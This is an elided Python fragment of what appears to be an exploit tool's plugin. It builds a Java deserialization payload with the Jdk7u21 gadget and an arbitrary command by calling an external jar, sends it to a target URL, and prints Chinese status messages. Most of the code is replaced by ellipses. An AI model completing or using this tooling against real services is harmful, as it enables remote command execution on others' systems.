...
@Idea.plugin_register('Class19:Jdk7u21')
class Jdk7u21(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'Jdk7u21', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****Jdk7u21模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****Jdk7u21模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
